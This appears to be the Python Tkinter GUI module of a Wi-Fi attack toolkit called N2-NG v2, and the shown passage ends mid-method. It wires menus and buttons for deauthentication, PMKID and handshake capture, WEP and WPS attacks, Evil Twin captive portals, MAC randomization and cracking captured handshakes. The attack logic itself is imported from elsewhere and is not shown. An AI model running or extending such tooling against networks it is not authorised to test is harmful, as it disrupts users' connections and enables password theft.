"""N2-NG v2 GUI — Tkinter, mimics v1's layout/aesthetic (updated), wired to
v2's own native attack functions throughout (never subprocess-wraps an
attack tool; John/hcxpcapngtool/pcapfix/mergecap are generic file-format
utilities, same category as v1's DependencyChecker tools, not attack logic).

The concrete bug this was built to fix: v1's toolbar is one long
`pack(side=LEFT)` row of ~10 buttons with no wrap and no menu fallback, so
buttons past the window edge become inaccessible when narrowed (main.py
_build_toolbar, 2783-2824). Every action here is reachable from a real
`tk.Menu` menu bar (native window chrome — cannot be clipped by resizing,
unlike a packed Frame), with the toolbar reduced to a few essential,
low-count controls so it's unlikely to overflow even on its own.
"""

from __future__ import annotations

import queue
import threading
import tkinter as tk
from tkinter import filedialog, messagebox, ttk

from .. import __version__
from ..scan import AccessPoint
from . import theme as theme_mod
from .crack_dialog import CrackDialog
from .widgets import SignalGraph

BROADCAST = "ff:ff:ff:ff:ff:ff"

TARGET_COLUMNS = (
    ("bssid", "BSSID", 150),
    ("ssid", "SSID", 180),
    ("channel", "CH", 40),
    ("security", "Security", 90),
    ("pmf", "PMF", 80),
    ("wps", "WPS", 70),
    ("signal", "Signal", 60),
)

CAPTURE_COLUMNS = (
    ("name", "File", 220),
    ("kind", "Kind", 90),
    ("size", "Size", 80),
    ("path", "Path", 420),
)

# v1's channel-lock discipline (main.py _select_target/_lock_channel/
# _check_channel_lock, 3421-3527): selecting a target auto-locks the
# adapter to that target's channel so a background scan loop doesn't keep
# hopping away from it mid-attack; auto-unlock after this many seconds of
# the locked target going unseen, so a stale lock doesn't strand the radio
# on a dead channel forever.
CHANNEL_LOCK_TIMEOUT = 30.0


class App:
    def __init__(self, root: tk.Tk, demo: bool = False):
        self.root = root
        self.root.title(f"N2-NG v2 — {__version__}")
        self.root.geometry("1320x780")
        self.root.minsize(760, 480)

        self.fonts = theme_mod.apply(root)
        self.THEME = theme_mod.THEME

        self._queue: queue.Queue = queue.Queue()
        self._busy = False
        self._scanning = threading.Event()
        self._stop_event = threading.Event()
        self._scan_thread: threading.Thread | None = None

        self.aps: dict[str, AccessPoint] = {}
        self.selected_bssid: str | None = None
        self._select_capture_watch_stop: threading.Event | None = None
        self.mon_iface: str | None = None
        self.own_mac: str | None = None
        self._permanent_mac: str | None = None  # set aside while MAC is randomized, for restore
        self.alfa_pair: tuple[str, str] | None = None  # (scan_iface, attack_iface) once detected

        from .settings import Settings

        self.settings = Settings()

        # Channel lock state — see CHANNEL_LOCK_TIMEOUT above.
        self.channel_locked = False
        self.locked_bssid: str | None = None
        self.locked_channel: int | None = None
        self._scan_channels: list[int] | None = None  # None = hop all; [ch] = locked
        self._lock_lost_since: float | None = None

        self.adapter_var = tk.StringVar()
        self.adapter_chipset_var = tk.StringVar(value="")
        self.iface_ap_var = tk.StringVar(value=self.settings.get("iface_ap", ""))
        self.mac_var = tk.StringVar(value="")
        self.monitor_status_var = tk.StringVar(value="MONITOR: OFF")
        self.channel_lock_var = tk.StringVar(value="SCANNING ALL CHANNELS")
        self.wordlist_var = tk.StringVar(value=self.settings.get("wordlist", ""))
        self.capture_dir_var = tk.StringVar()
        self.status_var = tk.StringVar(value="Ready.")
        self.randomize_mac_var = tk.BooleanVar(value=self.settings.get("randomize_mac", True))

        from ..storage import capture_root

        self.capture_dir_var.set(self.settings.get("capture_dir") or str(capture_root()))

        self._build_menubar()
        self._build_toolbar()
        self._build_body()
        self._build_status_bar()

        self._sort_col = self.settings.get("sort_col")
        self._sort_reverse = self.settings.get("sort_reverse", False)
        self.security_filter_var.set(self.settings.get("security_filter", "All"))

        self._refresh_adapters()
        saved_adapter = self.settings.get("adapter")
        if saved_adapter and saved_adapter in (self.adapter_combo["values"] or ()):
            self.adapter_var.set(saved_adapter)
        self._update_adapter_chipset_label()

        self.root.after(100, self._drain_queue)
        self.root.after(5000, self._check_channel_lock)
        self.root.after(200, lambda: self._check_dependencies(startup=True))
        self.root.protocol("WM_DELETE_WINDOW", self._on_close)

        if demo:
            self._load_demo_data()

    # ------------------------------------------------------------------
    # Menu bar — the resize-clip fix. Native window chrome, always reachable.
    # ------------------------------------------------------------------
    def _build_menubar(self):
        menubar = tk.Menu(self.root, tearoff=0, bg=self.THEME["panel"], fg=self.THEME["fg"])

        file_menu = tk.Menu(menubar, tearoff=0, bg=self.THEME["panel"], fg=self.THEME["fg"])
        file_menu.add_command(label="Set Capture Folder...", command=self._choose_capture_dir)
        file_menu.add_command(label="Set Wordlist...", command=self._choose_wordlist)
        file_menu.add_separator()
        file_menu.add_command(label="Exit", command=self._on_close)
        menubar.add_cascade(label="File", menu=file_menu)

        scan_menu = tk.Menu(menubar, tearoff=0, bg=self.THEME["panel"], fg=self.THEME["fg"])
        scan_menu.add_command(label="Refresh Adapters", command=self._refresh_adapters)
        scan_menu.add_command(label="Start Monitor Mode", command=self._start_monitor)
        scan_menu.add_command(label="Stop Monitor Mode", command=self._stop_monitor)
        scan_menu.add_checkbutton(label="Randomize MAC on Monitor Mode", variable=self.randomize_mac_var)
        scan_menu.add_separator()
        scan_menu.add_command(label="Start Scanning", command=self._start_scan)
        scan_menu.add_command(label="Stop Scanning", command=self._stop_scan)
        scan_menu.add_separator()
        scan_menu.add_command(label="Unlock Channel (resume hopping)", command=self._unlock_channel)
        menubar.add_cascade(label="Scan", menu=scan_menu)

        attack_menu = tk.Menu(menubar, tearoff=0, bg=self.THEME["panel"], fg=self.THEME["fg"])
        attack_menu.add_command(label="Deauth All Clients", command=self._attack_deauth_all)
        attack_menu.add_command(label="Deauth Selected Client", command=self._attack_deauth_client)
        attack_menu.add_command(label="PMKID Attack (Clientless)", command=self._attack_pmkid)
        attack_menu.add_command(label="Handshake Capture", command=self._attack_handshake)
        attack_menu.add_separator()
        attack_menu.add_command(label="Smart Attack (Auto)", command=self._attack_smart)
        attack_menu.add_command(label="OMNI Attack (All Stages)", command=self._attack_omni)
        attack_menu.add_command(label="WEP Attack", command=self._attack_wep)
        attack_menu.add_command(label="WEP Caffe Latte (client)", command=self._attack_caffe_latte)
        attack_menu.add_command(label="WEP Chopchop (decrypt)", command=self._attack_chopchop)
        attack_menu.add_command(label="WPS Null-PIN", command=self._attack_wps_null_pin)
        attack_menu.add_command(label="WPS Pixie-Dust (offline)", command=self._attack_wps_pixie)
        attack_menu.add_command(label="WPS Bruteforce (experimental)", command=self._attack_wps_bruteforce)
        attack_menu.add_command(label="Evil Twin (Captive Portal)", command=self._attack_eviltwin)
        attack_menu.add_separator()
        attack_menu.add_command(
            label="⚡ PINCER (Dual-Alfa)", command=self._attack_pincer, state=tk.DISABLED,
        )
        self.pincer_menu_index = attack_menu.index(tk.END)
        attack_menu.add_separator()
        attack_menu.add_command(label="Stop Attack", command=self._stop_attack)
        menubar.add_cascade(label="Attack", menu=attack_menu)
        self.attack_menu = attack_menu

        cap_menu = tk.Menu(menubar, tearoff=0, bg=self.THEME["panel"], fg=self.THEME["fg"])
        cap_menu.add_command(label="Refresh Captures", command=self._refresh_captures)
        cap_menu.add_command(label="Inspect Selected", command=self._capture_inspect)
        cap_menu.add_command(label="Convert to 22000", command=self._capture_convert)
        cap_menu.add_command(label="Fix Capture", command=self._capture_fix)
        cap_menu.add_command(label="Merge Selected", command=self._capture_merge)
        cap_menu.add_command(label="Crack Selected", command=self._capture_crack)
        cap_menu.add_command(label="Copy Path", command=self._capture_copy_path)
        cap_menu.add_separator()
        cap_menu.add_command(label="Crack Handshakes (folder)...", command=self._open_crack_dialog)
        cap_menu.add_command(label="Cleanup Handshakes...", command=self._capture_cleanup)
        menubar.add_cascade(label="Captures", menu=cap_menu)

        help_menu = tk.Menu(menubar, tearoff=0, bg=self.THEME["panel"], fg=self.THEME["fg"])
        help_menu.add_command(label="Check Dependencies", command=self._check_dependencies)
        help_menu.add_command(label="About", command=self._show_about)
        menubar.add_cascade(label="Help", menu=help_menu)

        self.root.config(menu=menubar)

    # ------------------------------------------------------------------
    # Toolbar — deliberately minimal (few widgets => unlikely to overflow
    # even on its own), authoritative access stays in the menu bar above.
    # ------------------------------------------------------------------
    def _build_toolbar(self):
        # Two short rows instead of v1's one long row: each row alone is
        # far below the width where wrapping/clipping would ever kick in,
        # and the menu bar above duplicates every action here regardless.
        container = ttk.Frame(self.root, style="Toolbar.TFrame", padding=6)
        container.pack(side=tk.TOP, fill=tk.X)

        row1 = ttk.Frame(container, style="Toolbar.TFrame")
        row1.pack(side=tk.TOP, fill=tk.X)
        ttk.Label(row1, text="Adapter:", style="Toolbar.TLabel").pack(side=tk.LEFT, padx=(2, 4))
        self.adapter_combo = ttk.Combobox(row1, textvariable=self.adapter_var, state="readonly", width=14)
        self.adapter_combo.pack(side=tk.LEFT, padx=2)
        self.adapter_combo.bind("<<ComboboxSelected>>", lambda _e: self._update_adapter_chipset_label())
        ttk.Label(row1, textvariable=self.adapter_chipset_var, style="PanelMuted.TLabel").pack(side=tk.LEFT, padx=(2, 6))
        ttk.Label(row1, textvariable=self.mac_var, style="Toolbar.TLabel").pack(side=tk.LEFT, padx=6)
        ttk.Button(row1, text="Start Monitor", command=self._start_monitor).pack(side=tk.LEFT, padx=3)
        ttk.Button(row1, text="Stop Monitor", command=self._stop_monitor).pack(side=tk.LEFT, padx=3)
        ttk.Label(row1, text="AP iface:", style="Toolbar.TLabel").pack(side=tk.LEFT, padx=(12, 4))
        self.iface_ap_combo = ttk.Combobox(
            row1, textvariable=self.iface_ap_var, state="readonly", width=10,
        )
        self.iface_ap_combo.pack(side=tk.LEFT, padx=2)
        self.iface_ap_combo.bind("<<ComboboxSelected>>", lambda _e: self._save_settings())

        row2 = ttk.Frame(container, style="Toolbar.TFrame")
        row2.pack(side=tk.TOP, fill=tk.X, pady=(4, 0))
        self.scan_btn = ttk.Button(row2, text="Start Scanning", command=self._toggle_scan, style="Accent.TButton")
        self.scan_btn.pack(side=tk.LEFT, padx=3)
        self.monitor_pill = tk.Label(
            row2, textvariable=self.monitor_status_var, bg=self.THEME["error"], fg="#1a0000",
            font=self.fonts["ui_bold"], padx=8, pady=2,
        )
        self.monitor_pill.pack(side=tk.LEFT, padx=8)

    # ------------------------------------------------------------------
    # Body: PanedWindow(target tree | notebook[Target, Captures]) + log
    # ------------------------------------------------------------------
    def _make_scrollable(self, parent) -> ttk.Frame:
        """Canvas+Scrollbar wrapper (v1's _build_scrollable_right_panel
        pattern, main.py:2755-2776) — the Target tab's content (signal
        graph + 10 attack buttons + auto-deauth row) is taller than fits
        on a shorter window with no scroll path otherwise; real bug user
        hit ("WPS Null-PIN barely visible", buttons below it unreachable).
        Returns the inner frame to build content into."""
        canvas = tk.Canvas(parent, bg=self.THEME["bg"], highlightthickness=0)
        vsb = ttk.Scrollbar(parent, orient=tk.VERTICAL, command=canvas.yview)
        canvas.configure(yscrollcommand=vsb.set)
        vsb.pack(side=tk.RIGHT, fill=tk.Y)
        canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        inner = ttk.Frame(canvas)
        window = canvas.create_window((0, 0), window=inner, anchor=tk.NW)

        def on_inner_configure(_event=None):
            canvas.configure(scrollregion=canvas.bbox("all"))

        def on_canvas_configure(event):
            canvas.itemconfig(window, width=event.width)

        inner.bind("<Configure>", on_inner_configure)
        canvas.bind("<Configure>", on_canvas_configure)

        def on_wheel(event):
            canvas.yview_scroll(-1 if event.delta > 0 else 1, "units")

        # bind_all only while the pointer is actually over this canvas —
        # a bare bind_all would hijack wheel scrolling in every other
        # scrollable widget (capture tree, log pane) too.
        canvas.bind("<Enter>", lambda _e: canvas.bind_all("<MouseWheel>", on_wheel))
        canvas.bind("<Leave>", lambda _e: canvas.unbind_all("<MouseWheel>"))
        return inner

    def _build_body(self):
        body = ttk.Frame(self.root, padding=6)
        body.pack(side=tk.TOP, fill=tk.BOTH, expand=True)

        pane = ttk.PanedWindow(body, orient=tk.HORIZONTAL)
        pane.pack(fill=tk.BOTH, expand=True)

        left = ttk.Frame(body)
        pane.add(left, weight=2)
        self._build_target_tree(left)

        right = ttk.Frame(body)
        pane.add(right, weight=3)
        notebook = ttk.Notebook(right)
        notebook.pack(fill=tk.BOTH, expand=True)

        target_tab = ttk.Frame(notebook, padding=8)
        notebook.add(target_tab, text="Target")
        self._build_target_panel(self._make_scrollable(target_tab))

        captures_tab = ttk.Frame(notebook, padding=8)
        notebook.add(captures_tab, text="Captures")
        self._build_captures_panel(captures_tab)

        self._build_log_pane(body)

    def _build_target_tree(self, parent):
        header_row = ttk.Frame(parent)
        header_row.pack(fill=tk.X, pady=(0, 4))
        ttk.Label(header_row, text="Scanned Access Points", style="Heading.TLabel").pack(side=tk.LEFT)

        filter_row = ttk.Frame(parent)
        filter_row.pack(fill=tk.X, pady=(0, 4))
        ttk.Label(filter_row, text="Filter:").pack(side=tk.LEFT)
        self.security_filter_var = tk.StringVar(value="All")
        filter_combo = ttk.Combobox(
            filter_row, textvariable=self.security_filter_var, state="readonly", width=14,
            values=("All", "Open", "WEP", "WPA/WPA2", "WPA3", "Transition"),
        )
        filter_combo.pack(side=tk.LEFT, padx=6)
        filter_combo.bind("<<ComboboxSelected>>", lambda _e: self._render_targets())

        # Horizontal scrollbar packed into parent BEFORE tree_frame so it
        # claims its strip at the bottom first — packing it after would
        # leave it no space once tree_frame's fill=BOTH/expand=True already
        # claimed everything.
        hsb = ttk.Scrollbar(parent, orient=tk.HORIZONTAL)
        hsb.pack(side=tk.BOTTOM, fill=tk.X)

        tree_frame = ttk.Frame(parent)
        tree_frame.pack(fill=tk.BOTH, expand=True)

        cols = [c[0] for c in TARGET_COLUMNS]
        self.tree = ttk.Treeview(tree_frame, columns=cols, show="headings", selectmode="browse")
        for key, heading, width in TARGET_COLUMNS:
            self.tree.heading(key, text=heading, command=lambda c=key: self._on_target_heading_click(c))
            # stretch=False: columns keep whatever width the user drags them
            # to instead of ttk auto-compressing them to fit the visible
            # pane — needed for the horizontal scrollbar below to mean
            # anything (2026-08-26 live-test note: columns weren't
            # comfortably resizable/reachable when narrower than total width).
            self.tree.column(key, width=width, minwidth=40, stretch=False)
        vsb = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.tree.yview)
        hsb.configure(command=self.tree.xview)
        self.tree.configure(yscrollcommand=vsb.set, xscrollcommand=hsb.set)
        self.tree.grid(row=0, column=0, sticky="nsew")
        vsb.grid(row=0, column=1, sticky="ns")
        tree_frame.rowconfigure(0, weight=1)
        tree_frame.columnconfigure(0, weight=1)
        self.tree.bind("<<TreeviewSelect>>", self._on_target_select)
        self.tree.bind("<Double-1>", self._on_target_double_click)
        self.tree.bind("<Button-3>", self._on_target_right_click)

        self.hidden_columns: set[str] = set(self.settings.get("hidden_columns", []))
        self._apply_column_visibility()

        # Row color by security (v1 main.py:4546-4550: OPN/WEP/WPA/WPA2/
        # WPA3 tag_configure) — v2 lacked this entirely until now.
        self.tree.tag_configure("open", foreground=self.THEME["accent"])
        self.tree.tag_configure("wep", foreground=self.THEME["error"])
        self.tree.tag_configure("wpa", foreground=self.THEME["warn"])
        self.tree.tag_configure("wpa2", foreground="#ffffff")
        self.tree.tag_configure("wpa3", foreground=self.THEME["info"])
        self.tree.tag_configure("transition", foreground="#cc88ff")
        self.tree.tag_configure("unknown", foreground=self.THEME["muted"])

        # Subtle row banding so the target list reads as separated rows
        # instead of one bunched block of text (2026-08-24 live-test note) —
        # ttk.Treeview under "clam" has no simple per-cell gridline option,
        # so alternating row background is the practical equivalent.
        # panel_alt (not panel) for the odd rows: bg->panel was too close a
        # jump to read as separated bands during live use (2026-08-26).
        self.tree.tag_configure("row_even", background=self.THEME["bg"])
        self.tree.tag_configure("row_odd", background=self.THEME["panel_alt"])

        self._sort_col: str | None = None
        self._sort_reverse = False

    def _build_target_panel(self, parent):
        title_row = ttk.Frame(parent)
        title_row.pack(fill=tk.X)
        self.target_title_var = tk.StringVar(value="No target selected")
        ttk.Label(title_row, textvariable=self.target_title_var, style="Heading.TLabel").pack(side=tk.LEFT)
        # Stop Attack lives here, next to Unlock, instead of at the bottom of
        # the attack-button stack below — a live-attack safety/speed issue
        # (2026-08-26 live-test note): it took too long to reach when an
        # attack needed to be killed quickly.
        ttk.Button(title_row, text="Stop Attack", command=self._stop_attack, style="Danger.TButton").pack(
            side=tk.RIGHT, padx=(6, 0))
        ttk.Button(title_row, text="Unlock", command=self._unlock_channel).pack(side=tk.RIGHT, padx=(0, 6))
        self.lock_pill = tk.Label(
            title_row, textvariable=self.channel_lock_var, bg=self.THEME["error"], fg="#1a0000",
            font=self.fonts["ui_bold"], padx=8, pady=2,
        )
        self.lock_pill.pack(side=tk.RIGHT)

        detail = ttk.Frame(parent)
        detail.pack(fill=tk.X, pady=(4, 6))
        self.target_detail_var = tk.StringVar(value="Select a target from the list on the left.")
        ttk.Label(detail, textvariable=self.target_detail_var, style="Muted.TLabel", justify=tk.LEFT).pack(anchor=tk.W)

        graph_header = ttk.Frame(parent)
        graph_header.pack(fill=tk.X, pady=(4, 2))
        ttk.Label(graph_header, text="Signal history (selected target)", style="PanelMuted.TLabel").pack(side=tk.LEFT)
        self.capture_size_var = tk.StringVar(value="")
        ttk.Label(graph_header, textvariable=self.capture_size_var, style="PanelMuted.TLabel").pack(side=tk.RIGHT)
        graph_frame = ttk.Frame(parent, style="Panel.TFrame")
        graph_frame.pack(fill=tk.X, pady=(0, 10))
        self.signal_graph = SignalGraph(graph_frame)

        ttk.Label(parent, text="Clients", style="PanelMuted.TLabel").pack(anchor=tk.W, pady=(0, 2))
        client_frame = ttk.Frame(parent)
        client_frame.pack(fill=tk.X, pady=(0, 10))
        self.client_tree = ttk.Treeview(
            client_frame, columns=("station", "signal"), show="headings", height=4, selectmode="browse",
        )
        self.client_tree.heading("station", text="Station")
        self.client_tree.column("station", width=160, minwidth=120)
        self.client_tree.heading("signal", text="Signal")
        self.client_tree.column("signal", width=70, minwidth=50)
        client_vsb = ttk.Scrollbar(client_frame, orient=tk.VERTICAL, command=self.client_tree.yview)
        self.client_tree.configure(yscrollcommand=client_vsb.set)
        self.client_tree.pack(side=tk.LEFT, fill=tk.X, expand=True)
        client_vsb.pack(side=tk.LEFT, fill=tk.Y)

        auto_row = ttk.Frame(parent)
        auto_row.pack(fill=tk.X, pady=(0, 6))
        self.auto_deauth_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(auto_row, text="Auto-deauth until handshake", variable=self.auto_deauth_var,
                        command=self._toggle_auto_deauth).pack(side=tk.LEFT)
        ttk.Label(auto_row, text="every").pack(side=tk.LEFT, padx=(10, 4))
        self.deauth_interval_var = tk.StringVar(value="10")
        ttk.Combobox(auto_row, textvariable=self.deauth_interval_var, state="readonly", width=4,
                     values=("10", "30", "60")).pack(side=tk.LEFT)
        ttk.Label(auto_row, text="s").pack(side=tk.LEFT, padx=(2, 0))

        ttk.Separator(parent).pack(fill=tk.X, pady=6)

        attacks = ttk.Frame(parent)
        attacks.pack(fill=tk.X)
        buttons = [
            ("Deauth All Clients", self._attack_deauth_all, "TButton"),
            ("Deauth Selected Client", self._attack_deauth_client, "TButton"),
            ("PMKID Attack (Clientless)", self._attack_pmkid, "TButton"),
            ("Handshake Capture", self._attack_handshake, "TButton"),
            ("Smart Attack (Auto)", self._attack_smart, "Accent.TButton"),
            ("OMNI Attack (All Stages)", self._attack_omni, "Accent.TButton"),
            ("WEP Attack", self._attack_wep, "TButton"),
            ("WEP Caffe Latte", self._attack_caffe_latte, "TButton"),
            ("WEP Chopchop", self._attack_chopchop, "TButton"),
            ("WPS Null-PIN", self._attack_wps_null_pin, "TButton"),
            ("WPS Pixie-Dust", self._attack_wps_pixie, "TButton"),
            ("WPS Bruteforce (experimental)", self._attack_wps_bruteforce, "TButton"),
            ("Evil Twin (Captive Portal)", self._attack_eviltwin, "TButton"),
        ]
        self.attack_buttons: list[ttk.Button] = []
        for label, cmd, style in buttons:
            b = ttk.Button(attacks, text=label, command=cmd, style=style)
            b.pack(fill=tk.X, pady=2)
            self.attack_buttons.append(b)

    def _build_captures_panel(self, parent):
        opts_row = ttk.Frame(parent)
        opts_row.pack(fill=tk.X, pady=(0, 8))
        ttk.Label(opts_row, text="Capture dir:").grid(row=0, column=0, sticky=tk.W, pady=2)
        ttk.Entry(opts_row, textvariable=self.capture_dir_var, width=40).grid(row=0, column=1, sticky=tk.EW, padx=6)
        ttk.Button(opts_row, text="Browse", command=self._choose_capture_dir).grid(row=0, column=2)
        ttk.Label(opts_row, text="Wordlist:").grid(row=1, column=0, sticky=tk.W, pady=2)
        ttk.Entry(opts_row, textvariable=self.wordlist_var, width=40).grid(row=1, column=1, sticky=tk.EW, padx=6)
        ttk.Button(opts_row, text="Browse", command=self._choose_wordlist).grid(row=1, column=2)
        opts_row.columnconfigure(1, weight=1)

        actions = ttk.Frame(parent)
        actions.pack(fill=tk.X, pady=6)
        for label, cmd in (
            ("Refresh", self._refresh_captures),
            ("Inspect", self._capture_inspect),
            ("Convert to 22000", self._capture_convert),
            ("Fix", self._capture_fix),
            ("Merge (2+)", self._capture_merge),
            ("Crack Selected", self._capture_crack),
            ("Copy Path", self._capture_copy_path),
        ):
            ttk.Button(actions, text=label, command=cmd).pack(side=tk.LEFT, padx=2)
        ttk.Button(actions, text="Crack Handshakes (folder)...", command=self._open_crack_dialog,
                   style="Accent.TButton").pack(side=tk.LEFT, padx=(10, 2))
        ttk.Button(actions, text="Cleanup Handshakes...", command=self._capture_cleanup, style="Danger.TButton").pack(side=tk.LEFT, padx=2)

        cols = [c[0] for c in CAPTURE_COLUMNS]
        self.capture_tree = ttk.Treeview(parent, columns=cols, show="headings", selectmode="extended", height=14)
        for key, heading, width in CAPTURE_COLUMNS:
            self.capture_tree.heading(key, text=heading)
            self.capture_tree.column(key, width=width, minwidth=40)
        vsb = ttk.Scrollbar(parent, orient=tk.VERTICAL, command=self.capture_tree.yview)
        self.capture_tree.configure(yscrollcommand=vsb.set)
        self.capture_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        vsb.pack(side=tk.RIGHT, fill=tk.Y)
        self.capture_tree.bind("<Button-3>", self._on_capture_right_click)

        self.root.after(50, self._refresh_captures)

    def _build_log_pane(self, parent):
        frame = ttk.Frame(parent)
        frame.pack(side=tk.BOTTOM, fill=tk.X, pady=(6, 0))
        ttk.Label(frame, text="Log", style="Muted.TLabel").pack(anchor=tk.W)
        self.log_text = tk.Text(
            frame, height=8, bg=self.THEME["bg"], fg=self.THEME["fg"], insertbackground=self.THEME["fg"],
            font=self.fonts["mono"], borderwidth=0, highlightthickness=1,
            highlightbackground=self.THEME["border"], wrap=tk.WORD,
        )
        vsb = ttk.Scrollbar(frame, orient=tk.VERTICAL, command=self.log_text.yview)
        self.log_text.configure(yscrollcommand=vsb.set, state=tk.DISABLED)
        self.log_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        vsb.pack(side=tk.LEFT, fill=tk.Y)

    def _build_status_bar(self):
        bar = ttk.Frame(self.root, style="Status.TFrame", padding=(8, 3))
        bar.pack(side=tk.BOTTOM, fill=tk.X)
        ttk.Label(bar, textvariable=self.status_var, style="Toolbar.TLabel").pack(side=tk.LEFT)

    # ------------------------------------------------------------------
    # Background execution: run fn() off the UI thread, results/log lines
    # come back through a queue drained on the Tk main loop via `after`.
    # ------------------------------------------------------------------
    def _drain_queue(self):
        try:
            while True:
                kind, payload = self._queue.get_nowait()
                if kind == "log":
                    self._append_log(payload)
                elif kind == "status":
                    self.status_var.set(payload)
                elif kind == "scan_update":
                    self._render_targets()
                elif kind == "signal_sample":
                    self.signal_graph.add_sample(payload)
                elif kind == "auto_deauth_done":
                    self.auto_deauth_var.set(False)
                elif kind == "capture_size":
                    self.capture_size_var.set(self._format_capture_size(payload))
                elif kind == "busy":
                    self._set_busy(payload)
                elif kind == "error":
                    messagebox.showerror("N2-NG v2", payload)
                elif kind == "info":
                    messagebox.showinfo("N2-NG v2", payload)
        except queue.Empty:
            pass
        self.root.after(100, self._drain_queue)

    def _append_log(self, msg: str):
        self.log_text.configure(state=tk.NORMAL)
        self.log_text.insert(tk.END, msg.rstrip() + "\n")
        self.log_text.see(tk.END)
        self.log_text.configure(state=tk.DISABLED)

    def _log(self, msg: str):
        self._queue.put(("log", msg))

    def _set_busy(self, busy: bool):
        self._busy = busy
        state = tk.DISABLED if busy else tk.NORMAL
        for b in self.attack_buttons:
            b.configure(state=state)

    def _run_bg(self, label: str, fn, *args, **kwargs):
        """Run fn(*args, **kwargs) in a background thread; log start/result/
        error, plus a periodic heartbeat while it's running. User feedback
        (2026-08-20): with no output for up to 60s (PMKID/handshake/WEP
        timeouts), it wasn't visible anything was actually happening.
        Generic fix at this one choke point instead of threading progress
        callbacks through every individual attack function."""
        if self._busy:
            messagebox.showwarning("N2-NG v2", "Another attack is already running. Use Stop Attack first.")
            return
        # A prior attack's "Stop Attack" leaves this set; without clearing
        # it here, every later attack that reads self._stop_event (Caffe
        # Latte, Chopchop, Evil Twin, Handshake Capture) would see itself
        # as already-stopped and abort instantly.
        self._stop_event.clear()
        self._queue.put(("busy", True))
        self._queue.put(("status", f"Running: {label}"))
        self._log(f">>> {label}")

        done = threading.Event()
        _last_progress: list[str] = []

        def progress_fn(msg: str) -> None:
            """Attack functions call this to emit mid-run status lines."""
            _last_progress.clear()
            _last_progress.append(msg)
            self._log(f"    {msg}")

        # Expose progress_fn to work functions via a thread-local attribute
        # so they can capture it without changing _run_bg's signature.
        self._progress_fn = progress_fn

        def heartbeat():
            elapsed = 0
            while not done.wait(10):
                elapsed += 10
                last = _last_progress[0] if _last_progress else None
                if last:
                    self._log(f"    [{elapsed}s] {last}")
                else:
                    self._log(f"    ... {label} still running ({elapsed}s)")

        threading.Thread(target=heartbeat, daemon=True).start()

        def worker():
            try:
                result = fn(*args, **kwargs)
                self._log(f"<<< {label} done: {result if result is not None else 'ok'}")
            except Exception as exc:  # noqa: BLE001 — surface every failure to the log/dialog
                self._log(f"!!! {label} failed: {exc}")
                self._queue.put(("error", f"{label} failed:\n{exc}"))
            finally:
                done.set()
                self._queue.put(("busy", False))
                self._queue.put(("status", "Ready."))

        threading.Thread(target=worker, daemon=True).start()

    # ------------------------------------------------------------------
    # Adapters / monitor mode
    # ------------------------------------------------------------------
    def _refresh_adapters(self):
        from ..radio import detect_alfa_pair, detect_interfaces

        try:
            ifaces = detect_interfaces()
        except Exception as exc:
            self._log(f"could not list adapters: {exc}")
            ifaces = []
        self.adapter_combo["values"] = ifaces
        if ifaces and not self.adapter_var.get():
            self.adapter_var.set(ifaces[0])

        self.iface_ap_combo["values"] = ifaces
        saved_iface_ap = self.settings.get("iface_ap", "")
        if saved_iface_ap and saved_iface_ap in ifaces:
            self.iface_ap_var.set(saved_iface_ap)
        elif not self.iface_ap_var.get() or self.iface_ap_var.get() not in ifaces:
            # Evil Twin needs a *second* interface distinct from the
            # monitor/scan adapter to host the AP on — default to the
            # first one that isn't already selected as the scan adapter.
            others = [i for i in ifaces if i != self.adapter_var.get()]
            self.iface_ap_var.set((others or ifaces or [""])[0])

        self.alfa_pair = detect_alfa_pair(ifaces)
        state = tk.NORMAL if self.alfa_pair else tk.DISABLED
        if hasattr(self, "pincer_menu_index"):
            self.attack_menu.entryconfig(self.pincer_menu_index, state=state)
        if self.alfa_pair:
            self._log(f"PINCER available: scan={self.alfa_pair[0]} attack={self.alfa_pair[1]}")
        self._update_adapter_chipset_label()

    @staticmethod
    def _display_ssid(ssid: str) -> str:
        """Render an SSID for the tree. Real, non-UTF8 SSIDs decode fine
        (frames.py falls back to latin-1 so nothing crashes), but many of
        those bytes are control/undefined codepoints that Tk renders as a
        wall of missing-glyph boxes. Swap only the non-printable characters
        for a single visible placeholder — display only, the underlying
        ap.ssid stays untouched for attacks/captures/targeting."""
        return "".join(c if c.isprintable() else "·" for c in ssid)

    @staticmethod
    def _vendor_label(driver: str | None) -> str:
        """Rough driver-name -> vendor label, purely so wlan0/wlan1 in the
        toolbar are visually distinguishable when both are present — not
        an exhaustive chipset database, just the common driver prefixes."""
        if not driver:
            return "?"
        d = driver.lower()
        if d.startswith("mt"):
            return "Mediatek"
        if d.startswith(("rtl", "rtw")):
            return "Realtek"
        if d.startswith("ath"):
            return "Atheros"
        if d.startswith("iwl"):
            return "Intel"
        return driver

    def _update_adapter_chipset_label(self):
        from ..radio import get_driver

        iface = self.adapter_var.get()
        if not iface:
            self.adapter_chipset_var.set("")
            return
        driver = get_driver(iface)
        self.adapter_chipset_var.set(f"({self._vendor_label(driver)})" if driver else "")

    def _start_monitor(self):
        iface = self.adapter_var.get()
        if not iface:
            messagebox.showwarning("N2-NG v2", "Select an adapter first.")
            return

        def work():
            from ..radio import get_mac, set_monitor_mode

            mon, permanent_mac = set_monitor_mode(iface, randomize_mac=self.randomize_mac_var.get())
            mac = get_mac(mon)
            self.mon_iface = mon
            self.own_mac = mac
            self._permanent_mac = permanent_mac
            self._queue.put(("status", f"Monitor mode on {mon}"))
            self.mac_var.set(mac + (" (randomized)" if permanent_mac else ""))
            self.monitor_status_var.set(f"MONITOR: {mon}")
            self.monitor_pill.configure(bg=self.THEME["accent"], fg=self.THEME["accent_text"])
            return mon

        self._run_bg("Start monitor mode", work)

    def _stop_monitor(self):
        if not self.mon_iface:
            return
        iface = self.mon_iface
        permanent_mac = self._permanent_mac

        def work():
            from ..radio import set_managed_mode

            set_managed_mode(iface, restore_mac=permanent_mac)
            self.mon_iface = None
            self._permanent_mac = None
            self.monitor_status_var.set("MONITOR: OFF")
            self.monitor_pill.configure(bg=self.THEME["error"], fg="#1a0000")
            return iface

        self._run_bg("Stop monitor mode", work)

    # ------------------------------------------------------------------
    # Scanning
    # ------------------------------------------------------------------
    def _toggle_scan(self):
        if self._scanning.is_set():
            self._stop_scan()
        else:
            self._start_scan()

    def _start_scan(self):
